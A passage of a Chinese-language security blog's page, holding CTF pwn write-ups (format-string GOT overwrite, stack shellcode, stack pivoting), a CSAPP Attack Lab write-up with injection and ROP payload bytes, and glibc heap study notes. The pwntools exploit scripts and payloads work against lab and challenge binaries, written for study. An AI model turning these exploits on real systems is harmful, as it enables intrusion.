log.info(hex(system_addr))</span></span><br><span class="line"><span class="comment"># log.info(hex(binsh_addr))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> + fmtstr_payload(<span class="number">8</span>, &#123;printf_got: system_addr&#125;, write_size=<span class="string">&#x27;byte&#x27;</span>, numbwritten=<span class="number">0xa</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># 8</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>在当前栈空间外面写shellcode，gdb调出偏移，借助最开始泄露的地址写入shellcode在栈上的地址，就能跳转到栈上的shellcode。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, &#x27;28529&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Yippie, lets crash: &#x27;</span>)</span><br><span class="line">buf = p.recvline().strip()</span><br><span class="line">base_addr = <span class="built_in">int</span>(buf, <span class="number">16</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># print(len(shellcode))</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x16</span> - <span class="number">0x8</span> + <span class="number">0x4</span>) + p32(base_addr - <span class="number">0x1c</span>) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>0x28的栈溢出只能输入0x30，这时候要用到栈劫持，新的知识点。</p>
<p>大体思路就是先通过一个<code>leave</code>然后<code>ret</code>的gadget强行把栈缩小，然后我们就在当前部分的栈帧里去布置就可以了。</p>
<p>直接粘核心exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ebp_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">str_addr = ebp_addr - <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(str_addr + <span class="number">0x10</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(str_addr) + p32(leave_ret)</span><br></pre></td></tr></table></figure>
<p>这个payload的构造挺巧妙的，稍微分析下：</p>
<p>最后的0x8个字节用字符串起始地址覆盖了ebp，后面紧接着<code>leave</code>和<code>ret</code>，<code>leave</code>的时候直接调到字符串其实地址，<code>ret</code>的时候从<code>aaaa</code>跳到后面的system函数地址。system参数，同样是用在栈上写字符串的方法解决的。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.top/2021/01/17/CSAPP-Attack-Lab-Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/17/CSAPP-Attack-Lab-Writeup/" class="post-title-link" itemprop="url">CSAPP Attack Lab Writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-17 11:45:32" itemprop="dateCreated datePublished" datetime="2021-01-17T11:45:32+08:00">2021-01-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>今天顺带把attack lab做完了，算是小小地复习了下栈溢出和ROP吧。</p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p><del>最开始我甚至都不知道这个lab要怎么开始做起，跑都跑不起来</del></p>
<p><code>hex2raw</code>读入以空格作为分隔的一个个字节，编码成一个个机器码。就跟pwntools里面的u32、u64差不多的作用。不然直接输入是没有用的。</p>
<p>直接运行<code>ctarget</code>或<code>rtarget</code>会没办法运行，报了个<code>Running on an illegal host</code>的错误。</p>
<p>我们加个<code>-q</code>的参数就能跑了。或者<code>-i</code>然后加上文件名，从文件里读入。</p>
<p>运行的方法是这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;hex2raw &lt; levelx.txt | .&#x2F;ctarget -q</span><br><span class="line">$ .&#x2F;hex2raw &lt; levelx.txt | .&#x2F;rtarget -q</span><br></pre></td></tr></table></figure>
<h2 id="Part-1-Code-Injection-Attacks"><a href="#Part-1-Code-Injection-Attacks" class="headerlink" title="Part 1: Code Injection Attacks"></a>Part 1: Code Injection Attacks</h2><p>这部分主要是利用了栈溢出，虽然checksec查到了canary，但在那个<code>Gets</code>函数里面看看汇编其实是没有的。</p>
<p>同时栈内存可执行，这是Level 2跟3的伏笔。</p>
<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>最简单的<code>gets</code>函数溢出，只要用<code>touch1</code>的地址覆盖rbp就可以了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/success1.png">
<h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>第二个要求利用栈溢出调用<code>touch2</code>，同时携带一个int参数，要求值跟cookie一致。</p>
<p>可以直接ROP解决，而这里因为栈可执行，还有往栈里写shellcode的做法，做下记录。</p>
<p>构造shellcode当然先写汇编，有两种写法：</p>
<h4 id="已知cookie再写入"><a href="#已知cookie再写入" class="headerlink" title="已知cookie再写入"></a>已知cookie再写入</h4><p>在<code>cookie.txt</code>里面就有cookie的值，我们只要把这个值赋给rdi就可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa, %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>因为是AT&amp;T语法，所以可以直接用<code>gcc -c</code>编译出未链接文件，然后我们objdump一下就可以看到对应的shellcode了。</p>
<p><code>ret</code>命令相当于一个<code>pop rip</code>，将<code>rip</code>指向了<code>0x4017ec</code>，即调用了<code>touch2</code>。</p>
<p>但是直接写shellcode得能执行啊，怎么让它执行？把rbp的值写成shellcode在栈上的地址。</p>
<p>这里又有一个小细节：<strong>字符串在栈里面通过push写入的话要翻转顺序，而shellcode需要正序写入。</strong>前面要写hello world的shellcode，字符串是反向写入的，因为我们读字符串自然是从低地址到高地址的。而shellcode就直接写就完事了。</p>
<p>所以我们需要获取栈的地址。那我们用gdb调一调就可以找到字符串的地址了：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/level2.png">
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/success2.png">
<h4 id="从程序中真正获取cookie的值"><a href="#从程序中真正获取cookie的值" class="headerlink" title="从程序中真正获取cookie的值"></a>从程序中真正获取cookie的值</h4><p>可以用汇编来获取地址的值，比如这样写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movq $0x006044e4, %rdi</span><br><span class="line">movq (%rdi), %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>这样就算cookie是个随机数，也能跳转，比较普适。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 e4 44 60 00 48</span><br><span class="line">8b 3f 68 ec 17 40 00 c3</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/success22.png">
<p>Jan 17 upd：第二种shellcode的汇编也可以这样写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq 0x006044e4, %rdi</span><br><span class="line">pushq $0x004017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>mov和lea的区别，就是mov会做一次dereference，而lea只进行计算。</p>
<p>只要mov的src不是一个immediate（最前面有一个$号）而是一个地址，默认都会把src这个地址dereference之后的值赋给dest。而lea就只是单纯计算之后把结果赋给dest。</p>
<p>对寄存器的dereference，还是打一个括号。上述强调的是immediate和memory的一个区别。</p>
<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>第三个要求我们继续利用那个漏洞跳入<code>touch3</code>，顺便携带一个字符串地址，还要跑过<code>hexmatch</code>函数的检测。</p>
<p>我们在基于Level 2在栈上写shellcode的思想，再在栈上储存一个字符串，然后rdi就指向这个字符串的地址，这样才能控制。</p>
<p>我们知道cookie值是0x59b997fa，但是我们要的是字符串且没有起始的0x。</p>
<p>所以我们要弄到”59b997fa”这段字符串，实际上写入的时候就得写入ASCII码了。</p>
<p>但是不能随便在栈里面随便找个地方存，因为后面执行<code>hexmatch</code>时，会把部分栈上内容overwrite掉，所以可以找个保险的地方，直接存到rbp紧接着的地址。</p>
<p>shellcode部分：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi</span><br><span class="line">pushq $0x004018fa</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>这里 解释一下：<code>0x5561dca8 = 0x5561dc78 + 0x28 + 0x8</code></p>
<p>把它翻译成机器码，粘在字符串里：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
<p>啊？前面不是说字符串要反过来嘛？怎么现在是正的？因为我们不是通过push来写入的。</p>
<p>众所周知，push进去的值是little endian储存的，所以字符串要反过来才是正确的顺序。</p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Attack-Lab-Writeup/success3.png">
<h2 id="Part-2-Return-Oriented-Programming"><a href="#Part-2-Return-Oriented-Programming" class="headerlink" title="Part 2: Return-Oriented Programming"></a>Part 2: Return-Oriented Programming</h2><p>第二部分相比第一部分加上了很多保护：打开了ASLR，NX Enable，把前面在栈里面写shellcode的想法杀死了。现在就可以使用ROP了。</p>
<p><code>farm.c</code>中似乎是些没用的函数，不过当变成机器码并且截取一小部分时，会有意想不到的收货。这个在<code>attacklab.pdf</code>里写的很清楚。</p>
<p>而我们大可直接用ROPgadget来做。。。</p>
<h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>用ROP来实现前面第二关的效果。直接用一个pop rdi的gadget就可以了。</p>
<p>略。</p>
<h3 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h3><p>现在就是真正的拼gadget了。</p>
<p>这里有一个问题：因为还是必须在栈里面存字符串，那怎么获取地址？栈地址已经会变化了。</p>
<p>在看别人博客的时候，看见一个非常非常重要的gadget：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004019d6 : lea rax, [rdi + rsi] ; ret</span><br></pre></td></tr></table></figure>
<p>只要其中一个是栈上的地址，我们控制另一个，就可以获得栈上任意处的地址。</p>
<p>开始扫gadget：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">--only &quot;mov|ret&quot;</span><br><span class="line">0x0000000000401b23 : mov byte ptr [rax + 0x605500], 0 ; ret</span><br><span class="line">0x0000000000400f63 : mov byte ptr [rip + 0x20454e], 1 ; ret</span><br><span class="line">0x000000000040214e : mov dword ptr [rdi + 8], eax ; ret</span><br><span class="line">0x0000000000401b10 : mov dword ptr [rip + 0x2045ee], eax ; ret</span><br><span class="line">0x0000000000402dd7 : mov eax, 0 ; ret</span><br><span class="line">0x0000000000401994 : mov eax, 1 ; ret</span><br><span class="line">0x0000000000401a07 : mov eax, esp ; ret</span><br><span class="line">0x0000000000401a9a : mov eax, esp ; ret 0x8dc3</span><br><span class="line">0x00000000004019a3 : mov edi, eax ; ret</span><br><span class="line">0x000000000040214d : mov qword ptr [rdi + 8], rax ; ret</span><br><span class="line">0x0000000000401a06 : mov rax, rsp ; ret</span><br><span class="line">0x00000000004019a2 : mov rdi, rax ; ret</span><br><span class="line">0x0000000000400c55 : ret</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--only &quot;pop|ret&quot;</span><br><span class="line">0x00000000004021d5 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line">0x00000000004018f5 : pop rbx ; pop rbp ; pop r12 ; ret</span><br><span class="line">0x00000000004011aa : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000401dab : pop rbx ; ret</span><br><span class="line">0x000000000040141b : pop rdi ; ret</span><br><span class="line">0x0000000000402b17 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000401383 : pop rsi ; ret</span><br><span class="line">0x0000000000402b13 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040137f : pop rsp ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x00000000004021d8 : pop rsp ; pop r13 ; ret</span><br><span class="line">0x00000000004018f8 : pop rsp ; ret</span><br><span class="line">0x0000000000400c55 : ret</span><br></pre></td></tr></table></figure>
<p>（略去了一部分没用的gadget）</p>
<p>我们可以先得到rsp的值，mov到rax，然后mov到rdi，这样rdi就拿到了栈顶的地址。</p>
<p>接下来通过pop rsi的gadget，我们再输入偏移，就可以通过前面的lea获取我们输入的字符串的地址。</p>
<p>最后mov到rdi上，就可以跳转到<code>touch3</code>了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">83 13 40 00 00 00 00 00</span><br><span class="line">40 00 00 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.top/2021/01/16/glibc-Heap-Learning/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/16/glibc-Heap-Learning/" class="post-title-link" itemprop="url">glibc Heap Learning</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-01-16 22:18:04" itemprop="dateCreated datePublished" datetime="2021-01-16T22:18:04+08:00">2021-01-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>学了好几天的堆，今晚把已经看过的堆的知识记录一下。</p>
<h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>系统用堆(Heap)来动态管理内存，堆从低地址向高地址生长。</p>
<p>一直听到堆栈的说法，其实堆跟栈区别真的很大的好吧：比如栈从高地址向低地址生长，内存较为固定，地址一直是<code>0x7ffff...</code>开头的，不能跟堆混为一谈吧。</p>
<p>堆的实现就是时间与空间达到权衡(trade off)的生动案例。后面我们会体会到。</p>
<p>堆想要效率高，就应该提高单次分配和释放的速率，同时也要减少内存空间利用的碎片化。</p>
<p>glibc中堆的管理器是ptmalloc2。我们在pwn学堆的时候，就学习ptmalloc2的堆管理。</p>
<h2 id="堆的两个C语言高级函数"><a href="#堆的两个C语言高级函数" class="headerlink" title="堆的两个C语言高级函数"></a>堆的两个C语言高级函数</h2><p>在C++里面是<code>new</code>跟<code>delete</code>，而在C语言里面是<code>malloc</code>跟<code>free</code>。</p>
<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void* malloc(size_t n);</span><br><span class="line">return a pointer to the newly-allocated chunk.</span><br></pre></td></tr></table></figure>
<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void free(void* p);</span><br><span class="line">release the chunk pointed by the pointer p</span><br></pre></td></tr></table></figure>
<h2 id="堆底层的常用概念"><a href="#堆底层的常用概念" class="headerlink" title="堆底层的常用概念"></a>堆底层的常用概念</h2><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>arena可以理解为一个区域内的内存集合，可以看作是一片连续的内存空间。</p>
<p>在多线程中，每个线程都有一个专属的arena，主线程的arena就叫<code>main_arena</code>，后续做题经常见到。</p>
<p>主线程的arena通过系统调用<code>sbrk</code>创建，通过<code>brk</code>进行伸缩，其他线程的arena通过<code>mmap</code>来创建。</p>
<p><code>main_arena</code>其实是由一个<code>struct malloc_state</code>来组织的，这个结构体里面储存了多种类型的bin和top chunk等内容。</p>
<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>chunk即是<code>malloc</code>和<code>free</code>操作时，内存块的基本单位。</p>
<h4 id="free-chunk的结构"><a href="#free-chunk的结构" class="headerlink" title="free chunk的结构"></a>free chunk的结构</h4><p>一个空闲的chunk不是都是unused area，而是在chunk的头部储存了很多信息，具体是这么储存的：</p>
<ul>
<li>prev_size：储存上一个chunk的size</li>
<li>size：储存当前free chunk的size</li>
<li>fd：下一个free chunk</li>
<li>bk：上一个free chunk</li>
<li>unused area</li>
</ul>
<p>另外，注意到x86-64平台下，chunk都是每8个字节对齐的，所以chunk的大小也一定是8个字节的倍数，所以上面用来表示size的8个字节，就可以保证二进制表示下最后必有3个0。</p>
<p>而这3个0的位置，就被设计来分别储存3个信息：</p>
<ul>
<li>N：NON_MAIN_ARENA，1表示不是main_arena的，0代表是main_arena的。</li>
<li>M：IS_MMAPPED，1代表该chunk是<code>mmap</code>出来的，0则不是。</li>
<li>P：PREV_INUSE，1代表前面的chunk正在被使用，0则代表前面的chunk是空闲的。</li>
</ul>
<h4 id="allocated-chunk的结构"><a href="#allocated-chunk的结构" class="headerlink" title="allocated chunk的结构"></a>allocated chunk的结构</h4><p>allocated chunk的结构跟free chunk大体相似，不过也有不同：</p>
<ul>
<li>prev_size、size、NMP这前两个字段都是跟free chunk一样的。</li>
<li>没有fd和bk，从第三个字段开始即可开始储存数据。</li>
</ul>
<p>注意一下，prev_size到底什么时候有必要？当可以与前面的chunk合并时有必要存在。</p>
<p>什么时候allocated chunk可以省去prev_size这一个字段的空间？当前面的chunk也是allocated的。</p>
<p>所以，在设计之中，allocated chunk之间是可以把prev_size那8个字节也用来存入数据，这样能多出8个字节的存储空间。</p>
<h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>top chunk就是一个arena里面最后的那块chunk，不管怎样都会存在，作为一个arena的结束，不输入任何一个bin。</p>
<p>top chunk可以通过系统调用<code>brk</code>来变长变短，也可以在<code>malloc</code>过程中被切出一块去用，但是一直会存在。</p>
<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>bin是用来管理<strong>空闲的chunk</strong>的一个数据结构，通过单向或双向链表来进行组织。</p>
<p>通过将不同类型的chunk放进不同的bin中进行管理，能够提高<code>malloc</code>过程找到合适的chunk的速率。</p>
<h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4><p>fast bin维护小型的内存块，将这些小内存块用于系统频繁的小型内存申请调用。</p>
<p>fast bin只有1组，也就是只有一条单向链表来维护。</p>
<p>fast bin中的free chunk有这么几个特点：</p>
<ol>
<li>不与其他的free chunk合并</li>
<li>使用singly linked list进行组织</li>
<li>采用Last In First Out Policy</li>
<li>申请小内存时，最先在fast bin中寻找</li>
<li>当被free时，不会将P位置0（PREV_INUSE）</li>
</ol>
<p>一般0x20到0x7f大小的chunk，在free后并且分类后，会被丢进fast bin进行维护。</p>
<h4 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h4><p>small bins有62组链表，负责维护相对较小的chunk。</p>
<p>small bins的free chunk就跟fast bin不同了：</p>
<ol>
<li>相同大小的chunk就会被放在同一组small bin之中</li>
<li>使用doubly linked list维护</li>
<li>First In First Out</li>
<li>当被free时，会诚实地记录P位</li>
<li>并且，有条件时，会主动地合并成一个更大的free chunk</li>
</ol>
<p>大小从0x80到0x400的chunk最后会被丢到small bins去维护。（大小小于1M）</p>
<h4 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h4><p>large bins共有63组。每一组large bin储存的不是特定大小的chunk，而是大小处在一定范围的chunk。</p>
<p>记录的方法与small bin几乎相同。一样是FIFO，一样是双向链表，一样会主动合并。</p>
<p>不过有一点特殊：large bin中的chunk是按照从大到小进行排序的。</p>
<p>大于0x400即1M的chunk就会被安排到large bin里面去。</p>
<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>unsorted bin可以通俗想象成是chunk的“垃圾桶”，任何大于0x80的chunk都会被丢进unsorted bin里面去。（太小的直接丢进fast bin里面维护）</p>
<p>unsorted bin中的chunk没有大小规定，也没有大小顺序，一切都是待整理状态。</p>
<p>在里面的chunk会通过后续的“捡垃圾”（即chunk维护整理工作）进入到专属的chunk。</p>
<p>与fast bin一样，unsorted bin也只有一组。也只是一个暂存的缓冲区域，该挑合适的chunk，还是去规定的bin找，万不得已最后才来搜垃圾堆嘛。。。</p>
<h3 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h3><p>有一个原则：任意两个物理相邻的空闲chunk不能排在一起。（不过fast bin还是得除外的）</p>
<h2 id="堆的工作流程"><a href="#堆的工作流程" class="headerlink" title="堆的工作流程"></a>堆的工作流程</h2><h3 id="malloc的工作流程"><a href="#malloc的工作流程" class="headerlink" title="malloc的工作流程"></a>malloc的工作流程</h3><h3 id="free的工作流程"><a href="#free的工作流程" class="headerlink" title="free的工作流程"></a>free的工作流程</h3>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.top/2021/01/16/First-Assignment-from-Kap0k/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/16/First-Assignment-from-Kap0k/" class="post-title-link" itemprop="url">First Assignment from Kap0k</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
